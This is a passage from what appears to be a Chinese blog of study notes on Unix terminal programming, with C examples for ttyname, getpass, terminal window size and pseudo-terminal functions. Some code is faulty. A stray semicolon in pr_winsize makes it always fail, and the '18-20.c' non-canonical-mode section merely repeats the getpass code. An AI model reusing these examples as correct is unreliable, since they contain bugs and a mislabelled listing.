<span class="hljs-title">devdir</span> *<span class="hljs-title">tail</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> pathname[_PC_PATH_MAX + <span class="hljs-number">1</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">char</span> *dirname)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">ddp</span>;</span><br>    <span class="hljs-type">int</span> len;<br><br>    len = <span class="hljs-built_in">strlen</span>(dirname); <span class="hljs-comment">//判断目录名长度</span><br><br>    <span class="hljs-keyword">if</span> ((dirname[len - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; (dirname[len - <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;/&#x27;</span> ||<br>    (dirname[len - <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; dirname[len<span class="hljs-number">-3</span>] == <span class="hljs-string">&#x27;/&#x27;</span>))) <br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(dirname, <span class="hljs-string">&quot;/dev/fd&quot;</span>) == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> ((ddp = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> devdir))) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> ((ddp-&gt;d_name = strdup(dirname)) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">free</span>(ddp);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ddp-&gt;d_next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (tail == <span class="hljs-literal">NULL</span>) &#123;<br>        head = ddp;<br>        tail = ddp;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        tail-&gt;d_next = ddp;<br>        tail = ddp;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cleanup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">ddp</span>, *<span class="hljs-title">nddp</span>;</span><br>    ddp = head;<br>    <span class="hljs-keyword">while</span> (ddp != <span class="hljs-literal">NULL</span>) &#123;<br>        nddp = ddp-&gt;d_next;<br>        <span class="hljs-built_in">free</span>(ddp-&gt;d_name);<br>        <span class="hljs-built_in">free</span>(ddp);<br>        ddp = nddp;<br>    &#125;<br>    head = <span class="hljs-literal">NULL</span>;<br>    tail = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<br><span class="hljs-title function_">searchidr</span><span class="hljs-params">(<span class="hljs-type">char</span> *dirname, <span class="hljs-keyword">struct</span> stat *fdstatp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">devstat</span>;</span><br>    DIR *dp;<br>    <span class="hljs-type">int</span> devlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> *<span class="hljs-title">dirp</span>;</span><br><br>    <span class="hljs-built_in">strcpy</span>(pathname, dirname);<br>    <span class="hljs-keyword">if</span> ((dp = opendir(dirname)) == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//打开指定的目录</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">strcat</span>(pathname, <span class="hljs-string">&quot;/&quot;</span>); <br>    devlen = <span class="hljs-built_in">strlen</span>(pathname);<br>    <span class="hljs-keyword">while</span> ((dirp = readdir(dp)) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">strcpy</span>(pathname + devlen, dirp-&gt;d_name);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(pathname, <span class="hljs-string">&quot;/dev/stdin&quot;</span>) == <span class="hljs-number">0</span> ||<br>        <span class="hljs-built_in">strcmp</span>(pathname, <span class="hljs-string">&quot;/dev/stdout&quot;</span>) == <span class="hljs-number">0</span> ||<br>        <span class="hljs-built_in">strcmp</span>(pathname, <span class="hljs-string">&quot;/dev/stderr&quot;</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//跳过终端</span><br>        <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (stat(pathname, &amp;devstat) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (S_ISDIR(devstat.st_mode)) &#123; <span class="hljs-comment">//判断是否为目录</span><br>            add(pathname); <span class="hljs-comment">//增加目录项</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (devstat.st_ino == fdstatp-&gt;st_ino &amp;&amp;<br>        devstat.st_dev == fdstatp-&gt;st_dev) &#123; <span class="hljs-comment">//找到对应目录项</span><br>            closedir(dp);<br>            <span class="hljs-keyword">return</span>(pathname);<br>        &#125;<br>    &#125;<br><br>    closedir(dp);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><br><span class="hljs-type">char</span> *<br><span class="hljs-title function_">ttyname</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">fdstat</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">devdir</span> *<span class="hljs-title">ddp</span>;</span><br>    <span class="hljs-type">char</span> *rval;<br><br>    <span class="hljs-keyword">if</span> (isatty(fd) == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (fstat(fd, &amp;fdstat) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (S_ISCHR(fdstat.st_mode) == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <br>    rval = searchidr(<span class="hljs-string">&quot;/dev&quot;</span>, &amp;fdstat); <span class="hljs-comment">//搜索/dev下的目录判断是否符合</span><br>    <span class="hljs-keyword">if</span> (rval == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">for</span> (ddp = head; ddp != <span class="hljs-literal">NULL</span>; ddp = ddp-&gt;d_next)<br>            <span class="hljs-keyword">if</span> ((rval = searchidr(ddp-&gt;d_name, &amp;fdstat)) != <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-keyword">break</span>;<br>    &#125;<br>    cleanup();<br>    <span class="hljs-keyword">return</span>(rval);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">0</span>)) &#123;<br>        name = ttyname(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">NULL</span>)<br>            name = <span class="hljs-string">&quot;undefined&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        name = <span class="hljs-string">&quot;not a tty&quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 0: %s\n&quot;</span>, name);<br><br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">1</span>)) &#123;<br>        name = ttyname(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">NULL</span>)<br>            name = <span class="hljs-string">&quot;undefined&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        name = <span class="hljs-string">&quot;not a tty&quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 1: %s\n&quot;</span>, name);<br><br>    <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>)) &#123;<br>        name = ttyname(<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">NULL</span>)<br>            name = <span class="hljs-string">&quot;undefined&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        name = <span class="hljs-string">&quot;not a tty&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd 2: %s\n&quot;</span>, name);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="规范模式"><a href="#规范模式" class="headerlink" title="规范模式"></a>规范模式</h2><p><strong>getpass函数实现</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PASS_LEN  8</span><br><br><span class="hljs-type">char</span> *<br><span class="hljs-title function_">getpass</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *prompt)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[MAX_PASS_LEN + <span class="hljs-number">1</span>];<br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">sigset_t</span> sig, osig;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span> <span class="hljs-title">ts</span>, <span class="hljs-title">ots</span>;</span><br>    FILE *fp;<br>    <span class="hljs-type">int</span> c;<br>    <span class="hljs-comment">//ctermid函数会返回当前的终端的字符串的指针</span><br>    <span class="hljs-keyword">if</span> ((fp = fopen(ctermid(<span class="hljs-literal">NULL</span>), <span class="hljs-string">&quot;r+&quot;</span>)) == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//打开当前终端</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    setbuf(fp, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//禁用缓冲</span><br><br>    sigemptyset(&amp;sig);<br>    sigaddset(&amp;sig, SIGINT); <span class="hljs-comment">//代表中断信号</span><br>    sigaddset(&amp;sig, SIGTSTP); <span class="hljs-comment">// 代表终端停止信号</span><br>    sigprocmask(SIG_BLOCK, &amp;sig, &amp;osig); <span class="hljs-comment">//阻塞两个信号</span><br><br>    tcgetattr(fileno(fp), &amp;ts); <span class="hljs-comment">//获取当前终端的属性</span><br>    ots = ts;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        ECHO：如果设置了该标志位，则终端将回显所有输入字符。默认情况下，该标志位是开启的。</span><br><span class="hljs-comment">        ECHOE：如果设置了该标志位，则终端将在接收到退格字符（^H）时，将光标移回前一个字符，并用空格符将该字符覆盖掉。默认情况下，该标志位是开启的。</span><br><span class="hljs-comment">        ECHOK：如果设置了该标志位，则终端将在接收到换行符（\n）时，将行清空。默认情况下，该标志位是关闭的。</span><br><span class="hljs-comment">        ECHONL：如果设置了该标志位，则终端将在接收到换行符（\n）时，回显该字符。默认情况下，该标志位是关闭的。</span><br><span class="hljs-comment">    */</span><br>    ts.c_lflag &amp;= ~(ECHO | ECHOE | ECHOK | ECHONL); <span class="hljs-comment">//关闭回显</span><br>    tcsetattr(fileno(fp), TCSAFLUSH, &amp;ts); <span class="hljs-comment">//TCSAFLUSH 是一个参数常量，用于 tcsetattr() 函数中。它表示在设置终端属性之前，将已经存在的输入数据丢弃，并等待所有输出数据传输完成后再进行设置。具体来说，TCSAFLUSH 参数的含义如下：</span><br>    <span class="hljs-built_in">fputs</span>(prompt, fp);<br><br>    ptr = buf;<br>    <span class="hljs-keyword">while</span> ((c = getc(fp)) != EOF &amp;&amp; c != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> (ptr &lt; &amp;buf[MAX_PASS_LEN])<br>            *ptr++ = c;<br>    *ptr = <span class="hljs-number">0</span>;<br>    putc(<span class="hljs-string">&#x27;\n&#x27;</span>, fp);<br>    tcsetattr(fileno(fp), TCSAFLUSH, &amp;ots);<br>    sigprocmask(SIG_SETMASK, &amp;osig, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//恢复原来的信号</span><br>    fclose(fp);<br>    <span class="hljs-keyword">return</span>(buf);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> *ptr;<br><br>    <span class="hljs-keyword">if</span> ((ptr = getpass(<span class="hljs-string">&quot;Enter password:&quot;</span>)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;getpass error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;password: %s\n&quot;</span>, ptr);<br><br>    <span class="hljs-keyword">while</span> (*ptr != <span class="hljs-number">0</span>)<br>        *ptr++ = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="非规范模式"><a href="#非规范模式" class="headerlink" title="非规范模式"></a>非规范模式</h2><p><strong>18-20.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PASS_LEN  8</span><br><br><span class="hljs-type">char</span> *<br><span class="hljs-title function_">getpass</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *prompt)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[MAX_PASS_LEN + <span class="hljs-number">1</span>];<br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">sigset_t</span> sig, osig;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span> <span class="hljs-title">ts</span>, <span class="hljs-title">ots</span>;</span><br>    FILE *fp;<br>    <span class="hljs-type">int</span> c;<br>    <span class="hljs-comment">//ctermid函数会返回当前的终端的字符串的指针</span><br>    <span class="hljs-keyword">if</span> ((fp = fopen(ctermid(<span class="hljs-literal">NULL</span>), <span class="hljs-string">&quot;r+&quot;</span>)) == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//打开当前终端</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    setbuf(fp, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//禁用缓冲</span><br><br>    sigemptyset(&amp;sig);<br>    sigaddset(&amp;sig, SIGINT); <span class="hljs-comment">//代表中断信号</span><br>    sigaddset(&amp;sig, SIGTSTP); <span class="hljs-comment">// 代表终端停止信号</span><br>    sigprocmask(SIG_BLOCK, &amp;sig, &amp;osig); <span class="hljs-comment">//阻塞两个信号</span><br><br>    tcgetattr(fileno(fp), &amp;ts); <span class="hljs-comment">//获取当前终端的属性</span><br>    ots = ts;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        ECHO：如果设置了该标志位，则终端将回显所有输入字符。默认情况下，该标志位是开启的。</span><br><span class="hljs-comment">        ECHOE：如果设置了该标志位，则终端将在接收到退格字符（^H）时，将光标移回前一个字符，并用空格符将该字符覆盖掉。默认情况下，该标志位是开启的。</span><br><span class="hljs-comment">        ECHOK：如果设置了该标志位，则终端将在接收到换行符（\n）时，将行清空。默认情况下，该标志位是关闭的。</span><br><span class="hljs-comment">        ECHONL：如果设置了该标志位，则终端将在接收到换行符（\n）时，回显该字符。默认情况下，该标志位是关闭的。</span><br><span class="hljs-comment">    */</span><br>    ts.c_lflag &amp;= ~(ECHO | ECHOE | ECHOK | ECHONL); <span class="hljs-comment">//关闭回显</span><br>    tcsetattr(fileno(fp), TCSAFLUSH, &amp;ts); <span class="hljs-comment">//TCSAFLUSH 是一个参数常量，用于 tcsetattr() 函数中。它表示在设置终端属性之前，将已经存在的输入数据丢弃，并等待所有输出数据传输完成后再进行设置。具体来说，TCSAFLUSH 参数的含义如下：</span><br>    <span class="hljs-built_in">fputs</span>(prompt, fp);<br><br>    ptr = buf;<br>    <span class="hljs-keyword">while</span> ((c = getc(fp)) != EOF &amp;&amp; c != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> (ptr &lt; &amp;buf[MAX_PASS_LEN])<br>            *ptr++ = c;<br>    *ptr = <span class="hljs-number">0</span>;<br>    putc(<span class="hljs-string">&#x27;\n&#x27;</span>, fp);<br>    tcsetattr(fileno(fp), TCSAFLUSH, &amp;ots);<br>    sigprocmask(SIG_SETMASK, &amp;osig, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//恢复原来的信号</span><br>    fclose(fp);<br>    <span class="hljs-keyword">return</span>(buf);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> *ptr;<br><br>    <span class="hljs-keyword">if</span> ((ptr = getpass(<span class="hljs-string">&quot;Enter password:&quot;</span>)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;getpass error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;password: %s\n&quot;</span>, ptr);<br><br>    <span class="hljs-keyword">while</span> (*ptr != <span class="hljs-number">0</span>)<br>        *ptr++ = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="终端窗口大小"><a href="#终端窗口大小" class="headerlink" title="终端窗口大小"></a>终端窗口大小</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ws_row; <span class="hljs-comment">//终端窗口的行数，可显示的文本行数</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ws_col; <span class="hljs-comment">//终端窗口的列数，可显示的文本列数</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ws_xpixel; <span class="hljs-comment">//终端窗口的宽度</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ws_ypixel; <span class="hljs-comment">//终端窗口的高度</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>18-22.c获取窗口大小</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> TIOCGWINSZ</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">pr_winsize</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">size</span>;</span><br>    <br>    <span class="hljs-keyword">if</span> (ioctl(fd, TIOCGWINSZ, (<span class="hljs-type">char</span> *)&amp;size));<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;TIOCGWINSZ error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d rows, %d columns\n&quot;</span>, size.ws_row, size.ws_col);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sig_winch</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIGWINCH received\n&quot;</span>);<br>    pr_winsize(STDIN_FILENO);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (isatty(STDIN_FILENO) == <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (signal(SIGWINCH, sig_winch) == SIG_ERR)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;signal error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    pr_winsize(STDIN_FILENO);<br><br>    <span class="hljs-keyword">for</span> ( ; ; )<br>        pause();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="打开伪终端设备"><a href="#打开伪终端设备" class="headerlink" title="打开伪终端设备"></a>打开伪终端设备</h2><p>打开主设备</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">posix_openpt</span><span class="hljs-params">(<span class="hljs-type">int</span> oflag)</span>;<br><span class="hljs-comment">//返回值：若成功，返回下一个可用的PTY主设备文件描述符；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>oflag</code>：打开标志</li></ul><p><code>grantpt</code>获取访问从设备的权限，<code>unlockpt</code>解除限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">grantpt</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">unlockpt</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><br><span class="hljs-comment">//两个函数的返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><p>获取从设备的路径</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">ptsname</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><br><span 